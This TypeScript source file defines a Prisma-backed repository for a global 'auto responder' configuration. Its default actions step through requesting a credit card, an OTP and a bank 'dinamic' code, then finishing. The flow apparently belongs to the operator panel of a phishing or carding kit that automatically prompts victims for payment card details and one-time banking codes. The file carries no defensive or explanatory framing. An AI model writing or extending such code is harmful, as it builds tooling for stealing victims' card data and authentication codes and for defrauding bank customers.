import { prisma } from "./prismaClient.js";

export type AutoResponderConfigData = {
  id: string;
  enabled: boolean;
  timeout: number;
  actions: Record<string, string>;
};

const DEFAULTS: AutoResponderConfigData = {
  id: "global",
  enabled: false,
  timeout: 15,
  actions: {
    DATA_WAIT_ACTION: "request_cc",
    CC_WAIT_ACTION: "request_otp",
    AUTH_WAIT_ACTION: "request_dinamic",
    DINAMIC_WAIT_ACTION: "request_otp",
    OTP_WAIT_ACTION: "request_finish",
  },
};

export class PrismaAutoResponderConfigRepository {
  async get(): Promise<AutoResponderConfigData> {
    const row = await prisma.autoResponderConfig.findUnique({
      where: { id: "global" },
    });
    if (!row) return { ...DEFAULTS, actions: { ...DEFAULTS.actions } };
    return {
      id: row.id,
      enabled: row.enabled,
      timeout: row.timeout,
      actions: (row.actions as Record<string, string>) ?? { ...DEFAULTS.actions },
    };
  }

  async upsert(
    patch: Partial<Omit<AutoResponderConfigData, "id">>
  ): Promise<AutoResponderConfigData> {
    const row = await prisma.autoResponderConfig.upsert({
      where: { id: "global" },
      update: {
        ...(patch.enabled !== undefined ? { enabled: patch.enabled } : {}),
        ...(patch.timeout !== undefined ? { timeout: patch.timeout } : {}),
        ...(patch.actions !== undefined ? { actions: patch.actions } : {}),
      },
      create: {
        id: "global",
        enabled: patch.enabled ?? DEFAULTS.enabled,
        timeout: patch.timeout ?? DEFAULTS.timeout,
        actions: (patch.actions as any) ?? DEFAULTS.actions,
      },
    });
    return {
      id: row.id,
      enabled: row.enabled,
      timeout: row.timeout,
      actions: (row.actions as Record<string, string>) ?? { ...DEFAULTS.actions },
    };
  }
}
